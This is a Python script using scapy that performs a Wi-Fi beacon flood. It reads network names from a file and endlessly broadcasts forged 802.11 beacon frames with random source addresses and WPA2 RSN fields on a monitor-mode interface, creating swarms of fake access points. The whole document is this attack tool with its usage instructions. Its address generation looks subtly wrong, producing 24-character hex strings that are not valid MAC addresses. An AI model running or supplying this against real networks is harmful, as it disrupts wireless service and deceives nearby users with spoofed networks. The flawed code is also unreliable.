from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, hexdump
import sys
import os,binascii

def usage():
    if len(sys.argv) != 3:
        print("syntax : beacon-flood <interface> <ssid-list-file>")
        print("sample : beacon-flood mon0 ssid-list.txt")
        sys.exit()

def file_open():
    essid = []
    addr1 = []
    addr2 = []
    addr3 = []
    f = open(sys.argv[2], 'r')
    for tmp in f.readlines():
        tmp = tmp.replace("\n", "")
        essid.append(tmp)

        #mac print
        addr1.append(binascii.b2a_hex(os.urandom(12)))
        addr2.append(binascii.b2a_hex(os.urandom(12)))
        addr3.append(binascii.b2a_hex(os.urandom(12)))
    f.close()
    return essid, addr1, addr2, addr3


def beacon_flood(essid, addr1, addr2, addr3):
    while(1):
        for i in range(0, len(essid)):
            dot11 = Dot11(type=0, subtype=8, addr1 = addr1[i], addr2 = addr2[i], addr3 = addr3[i])
            beacon = Dot11Beacon(cap='ESS+privacy')
            ressid = Dot11Elt(ID='SSID', info=essid[i], len=len(essid[i]))
            print(ressid)
            rsn = Dot11Elt(ID='RSNinfo', info=(
            '\x01\x00'
            '\x00\x0f\xac\x02'
            '\x02\x00'
            '\x00\x0f\xac\x04'
            '\x00\x0f\xac\x02'
            '\x01\x00'
            '\x00\x0f\xac\x02'
            '\x00\x00'))

            frame = RadioTap()/dot11/beacon/ressid/rsn

            sendp(frame, iface=sys.argv[1], inter=0.001, loop=0)


if __name__ == "__main__":
    usage()
    essid, addr1, addr2, addr3 = file_open()
    beacon_flood(essid, addr1, addr2, addr3)